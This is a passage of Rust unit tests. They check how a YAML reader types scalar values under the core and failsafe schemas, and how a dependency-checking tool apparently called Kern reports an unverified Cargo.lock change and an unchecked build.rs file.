    assert_eq!(one("a: true\nb: 'true'\nc: ~\nd: 12\ne: 1.5\nf: 1.0.0\ng: [false, 'x', 3]\nh:\n  - NULL\n  - \"1\"\ni: 2.0\nj: FALSE\nk: 1e3\nl:\nm: 0\n", Schema::Core),
        Ok(json!({ "a": true, "b": "true", "c": null, "d": 12, "e": 1.5, "f": "1.0.0", "g": [false, "x", 3], "h": [null, "1"], "i": 2, "j": false, "k": 1000, "l": null, "m": 0 })));
    for text in ["a: 0x1F\n", "a: 0o17\n", "a: 1_000\n", "a: .inf\n", "a: -.5\n", "a: +1\n", "a: 2001-12-14\n", "a: 0123\n", "a: 1e400\n", "a: [9007199254740993]\n", "a:\n  - .NaN\n", "a: 1.\n"] {
        assert!(one(text, Schema::Core).is_err(), "a number or date whose type YAML readers do not agree on is refused, never guessed: {text:?}");
    }
    assert_eq!(one("a: true\nb: 12\nc: 0x1F\n", Schema::Failsafe), Ok(json!({ "a": "true", "b": "12", "c": "0x1F" })), "yarn reads its lockfile with every scalar as text");
}


#[test]
fn langfuse_langfuse_18974_a_cargo_lock_that_is_not_verified_is_not_listed_again_as_a_kind_of_file_kern_does_not_check() {
    let lock = |v: &str| format!("version = 4\n\n[[package]]\nname = \"tokio\"\nversion = \"{v}\"\n");
    let rules = rules_for(&[("package.json", MANIFEST), ("ai-gateway/Cargo.lock", &lock("1.47.1"))], &[("ai-gateway/Cargo.lock", &lock("1.48.0")), ("ai-gateway/build.rs", "fn main() {}\n")]);
    let d = json!({ "base": "1".repeat(40), "head": "2".repeat(40), "skipped": [], "unmeasured": [{ "path": "ai-gateway/Cargo.lock", "why": "other files" }, { "path": "ai-gateway/build.rs", "why": "other files" }] });
    let tests = json!({ "status": "RAN", "runner": "vitest", "before": { "passed": 1, "failed": 0, "skipped": 0 }, "after": { "passed": 1, "failed": 0, "skipped": 0 }, "kept": 1,
        "broke": [], "flaky": [], "gone": [], "newly_skipped": [], "added": [], "already_failing": [], "new_problems": [] });
    let r = receipt::build(&d, &rules, &tests);
    assert_eq!(kinds(&r, "unverified"), ["not-checked-install"], "{r}");
    assert_eq!(r["not_checked"], json!([{ "what": "`ai-gateway/build.rs`: Kern does not check this kind of file" }]), "the file is named once, where it decides the answer");
}
